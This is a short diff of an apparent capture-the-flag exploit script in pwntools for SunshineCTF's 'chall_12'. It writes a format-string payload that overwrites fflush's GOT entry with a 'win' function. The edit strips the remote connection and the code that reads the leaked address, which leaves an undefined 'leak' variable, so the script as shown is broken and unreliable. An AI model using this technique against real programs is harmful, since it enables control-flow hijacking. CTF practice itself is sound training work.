@@ -2,17 +2,10 @@ from pwn import *
 
 binary = context.binary = ELF('./chall_12')
 
-if not args.REMOTE:
-    p = process(binary.path)
-else:
-    p = remote('chal.2020.sunshinectf.org', 30012)
+p = process('./chall_12')
 
-p.recvuntil('Just a single second: ')
-_ = p.recvline().strip()
-main = int(_,16)
+main = int(leak,16)
 binary.address = main - binary.sym.main
-log.info('binary.address: ' + hex(binary.address))
-p.sendline()
 
 offset = 6
 payload = fmtstr_payload(offset,{binary.got.fflush:binary.sym.win})
